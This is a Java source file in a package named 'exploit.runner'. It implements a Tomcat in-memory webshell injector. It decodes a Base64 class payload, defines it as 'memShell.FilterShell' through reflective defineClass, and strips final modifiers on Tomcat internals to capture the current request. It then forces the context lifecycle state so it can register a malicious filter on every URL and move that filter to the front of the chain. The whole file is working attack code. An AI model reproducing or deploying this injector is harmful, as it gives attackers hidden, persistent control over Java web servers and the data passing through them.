package main.exploit.runner;

import org.apache.catalina.core.StandardContext;
import org.apache.catalina.util.LifecycleBase;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.FilterRegistration;
import javax.servlet.ServletContext;
import javax.servlet.ServletRequest;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Base64;

import static org.apache.catalina.LifecycleState.STARTED;
import static org.apache.catalina.LifecycleState.STARTING_PREP;

public class Filter {
    public static void inject(String base64String) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException {
        Class c = Class.forName("org.apache.catalina.core.ApplicationDispatcher");
        String className = "memShell.FilterShell";
        byte[] bytes = Base64.getDecoder().decode(base64String);
        ClassLoader classLoader = Thread.currentThread().getClass().getClassLoader();
        try {
            Class.forName("FilterShell");
        } catch (Exception e){
            Method method = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
            method.setAccessible(true);
            method.invoke(classLoader, className, bytes, 0, bytes.length);
        }
        Field f = c.getDeclaredField("WRAP_SAME_OBJECT");
        Field modifiersField = f.getClass().getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
        f.setAccessible(true);
        if (!f.getBoolean(null)) {
            f.setBoolean(null, true);
        }
        //初始化 lastServicedRequest
        c = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
        f = c.getDeclaredField("lastServicedRequest");
        modifiersField = f.getClass().getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
        f.setAccessible(true);
        if (f.get(null) == null) {
            f.set(null, new ThreadLocal());
        }
        //初始化 lastServicedResponse
        f = c.getDeclaredField("lastServicedResponse");
        modifiersField = f.getClass().getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
        f.setAccessible(true);
        if (f.get(null) == null) {
            f.set(null, new ThreadLocal());
        }
        Field field = org.apache.catalina.core.ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
        field.setAccessible(true);
        ThreadLocal threadLocal = (ThreadLocal) field.get(null);
        ServletRequest servletRequest = null;
        if (threadLocal != null && threadLocal.get() != null) {
            servletRequest = (ServletRequest) threadLocal.get();
        }
        if (servletRequest != null) {
            ServletContext servletContext = servletRequest.getServletContext();
            StandardContext standardContext = null;
            if (servletContext.getFilterRegistration("/asd") == null) {
                for (; standardContext == null; ) {
                    Field contextField = servletContext.getClass().getDeclaredField("context");
                    contextField.setAccessible(true);
                    Object object = contextField.get(servletContext);
                    if (object instanceof ServletContext) {
                        servletContext = (ServletContext) object;
                    } else if (object instanceof StandardContext) {
                        standardContext = (StandardContext) object;
                    }
                }
                if (standardContext != null && !standardContext.findFilterMaps()[0].getFilterName().equalsIgnoreCase("asd")) {
                    Field stateField = LifecycleBase.class.getDeclaredField("state");
                    stateField.setAccessible(true);
                    stateField.set(standardContext, STARTING_PREP);
                    FilterRegistration.Dynamic dynamic = servletContext.addFilter("asd", (javax.servlet.Filter) classLoader.loadClass(className).newInstance());
                    dynamic.setInitParameter("encoding", "utf8");
                    dynamic.setAsyncSupported(false);
                    dynamic.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, new String[]{"/*"});
                    if (stateField != null){
                        stateField.set(standardContext, STARTED);
                    }
                    if (standardContext != null){
                        Method filterStartMethod = StandardContext.class.getMethod("filterStart");
                        filterStartMethod.setAccessible(true);
                        filterStartMethod.invoke(standardContext, null);
                        FilterMap[] filterMaps = standardContext.findFilterMaps();
                        for (int i = 0; i < filterMaps.length; i++){
                            if (filterMaps[i].getFilterName().equalsIgnoreCase("asd")){
                                FilterMap filterMap = filterMaps[i];
                                filterMaps[i] = filterMaps[0];
                                filterMaps[0] = filterMap;
                                break;
                            }
                        }
                    }
                }
            }
        }
    }
}
